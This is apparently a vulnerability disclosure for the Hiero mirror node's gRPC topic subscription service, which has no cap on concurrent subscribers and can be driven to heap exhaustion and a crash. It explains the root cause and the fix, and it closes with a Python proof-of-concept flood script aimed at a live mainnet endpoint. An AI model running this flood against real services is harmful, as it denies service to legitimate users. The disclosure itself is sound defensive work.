### Title
Unbounded Subscriber Accumulation in `subscribeTopic()` Leads to JVM Heap Exhaustion (DoS)

### Summary
`TopicMessageServiceImpl.subscribeTopic()` allocates a new `TopicContext` object (plus a full Reactor pipeline) for every incoming subscription with no application-level cap on total concurrent subscribers. The `subscriberCount` field is a metrics-only gauge that is never checked against a maximum before accepting a new subscription. An attacker who opens many TCP connections can accumulate arbitrarily many live `TopicContext` objects and their associated Reactor operator chains in heap, eventually causing an OOM crash that denies all topic-message gossip to legitimate clients.

### Finding Description

**Exact code path:**

`TopicMessageServiceImpl.subscribeTopic()` — `grpc/src/main/java/org/hiero/mirror/grpc/service/TopicMessageServiceImpl.java`, lines 59–92.

```java
// Line 48 – counter is metrics-only, never enforced
private final AtomicLong subscriberCount = new AtomicLong(0L);

@Override
public Flux<TopicMessage> subscribeTopic(TopicMessageFilter filter) {
    TopicContext topicContext = new TopicContext(filter);   // line 61 – always allocated

    Flux<TopicMessage> historical = topicMessageRetriever.retrieve(filter, true);
    Flux<TopicMessage> live = Flux.defer(() -> incomingMessages(topicContext));
    Flux<TopicMessage> safetyCheck = Mono.delay(Duration.ofSeconds(1L))
            ...
            .subscribeOn(Schedulers.boundedElastic());

    ...
    return topicExists(filter)
            .thenMany(flux
                    .doOnSubscribe(s -> subscriberCount.incrementAndGet())  // line 89
                    .doFinally(s -> subscriberCount.decrementAndGet())      // line 90
                    ...);
}
```

**Root cause:** `subscriberCount` is incremented and decremented purely for the Micrometer gauge registered in `init()` (lines 52–56). There is no guard of the form `if (subscriberCount.get() >= maxSubscribers) return Mono.error(...)` anywhere in the method or in `topicExists()`. Every call unconditionally allocates a `TopicContext` (line 61) containing an `AtomicLong`, an `AtomicReference<TopicMessage>`, a Guava `Stopwatch`, an `EntityId`, and a `TopicMessageFilter` (with a random `subscriberId` string), plus the full Reactor operator chain (`historical`, `live`, `safetyCheck`, `pastEndTime`, `filter`, `takeWhile`, `take`, `doOnNext`, `doFinally`).

**Failed assumption:** The design assumes that the Netty-level `maxConcurrentCallsPerConnection = 5` (default, `NettyProperties` line 14; applied in `GrpcConfiguration` line 33) is sufficient to bound total resource consumption. It is not: it limits calls *per TCP connection*, not the total number of connections. An attacker opens C connections × 5 calls = 5C concurrent subscriptions with no further check.

**Contrast with the GraphQL design** (`docs/design/contract-log-subscription.md`, lines 160–167): the `ContractLogTopicListener` design explicitly specifies a `canSubscribe()` guard that checks `subscriberCount < maxActiveSubscriptions` before accepting a subscription. No equivalent guard exists for `TopicMessageServiceImpl`.

### Impact Explanation

Each live subscription retains in heap:
- One `TopicContext` (~5 object fields + Stopwatch internals)
- One `PollingContext` inside `PollingTopicMessageRetriever` (AtomicLong × 2, AtomicReference, Stopwatch, Duration, int)
- Multiple Reactor `Flux` operator nodes (historical, live, safetyCheck, merge, concatWith, filter, takeWhile, take, doOnNext, doFinally × 2)
- A `boundedElastic` scheduler task for the safetyCheck

With tens of thousands of concurrent subscriptions (achievable with ~2 000–10 000 TCP connections), heap pressure causes GC thrashing and ultimately an `OutOfMemoryError`, crashing the Spring Boot process. This terminates all active topic-message streams, preventing every legitimate client from receiving HCS transaction gossip — a complete denial of the mirror node's primary gRPC service.

### Likelihood Explanation

- **No authentication required.** The gRPC endpoint is publicly accessible; no API key, token, or account credential is needed to call `subscribeTopic`.
- **Topic ID is trivially obtained.** Any topic ID visible on the Hedera public ledger satisfies the `topicExists()` check (default `checkTopicExists = true`).
- **Per-connection limit is easily bypassed.** Opening thousands of TCP connections is a standard capability for any attacker with a modest botnet or even a single machine with sufficient file descriptors.
- **GCP `maxRatePerEndpoint: 250`** (`charts/hedera-mirror-grpc/values.yaml`, line 69) is a *request-rate* limit, not a concurrent-connection or concurrent-stream limit; long-lived streaming RPCs are established once and then persist, so the rate limit does not cap the steady-state number of open subscriptions.
- **Repeatability:** After a crash and restart, the attack can be immediately repeated.

### Recommendation

1. **Add an application-level subscriber cap** in `subscribeTopic()`, mirroring the pattern described for `ContractLogTopicListener`:
   ```java
   private final int maxSubscribers = grpcProperties.getMaxSubscribers(); // new config field

   @Override
   public Flux<TopicMessage> subscribeTopic(TopicMessageFilter filter) {
       if (subscriberCount.get() >= maxSubscribers) {
           return Flux.error(new StatusRuntimeException(
               Status.RESOURCE_EXHAUSTED.withDescription("Max subscribers reached")));
       }
       ...
   }
   ```
2. **Add `maxSubscribers`** to `GrpcProperties` with a safe default (e.g., 5 000).
3. **Enforce a per-IP or per-connection subscription limit** at the Netty interceptor level to prevent a single source from consuming the entire budget.
4. **Consider reducing `maxConcurrentCallsPerConnection`** further and adding a total-connection limit at the load balancer.

### Proof of Concept

```python
import grpc
import threading
from hedera import consensus_service_pb2_grpc, consensus_service_pb2
from hedera import timestamp_pb2, basic_types_pb2

TARGET = "mirror.mainnet.hedera.com:443"
TOPIC_ID = basic_types_pb2.TopicID(shardNum=0, realmNum=0, topicNum=<valid_topic>)
NUM_CONNECTIONS = 2000
CALLS_PER_CONN = 5  # matches maxConcurrentCallsPerConnection default

def flood(conn_id):
    channel = grpc.secure_channel(TARGET, grpc.ssl_channel_credentials())
    stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
    query = consensus_service_pb2.ConsensusTopicQuery(
        topicID=TOPIC_ID,
        # no endTime → subscription never self-terminates
    )
    streams = []
    for _ in range(CALLS_PER_CONN):
        stream = stub.subscribeTopic(query)
        streams.append(stream)
    # Hold connections open indefinitely
    threading.Event().wait()

threads = [threading.Thread(target=flood, args=(i,)) for i in range(NUM_CONNECTIONS)]
for t in threads:
    t.start()
# 2000 connections × 5 calls = 10 000 concurrent TopicContext objects retained in heap
# Monitor JVM heap via hiero_mirror_grpc_subscribers metric; OOM expected as heap fills
```

Each of the 10 000 live subscriptions holds a `TopicContext` + full Reactor pipeline in heap. With default JVM heap settings, OOM occurs within minutes, crashing the service and denying all legitimate HCS topic-message gossip.
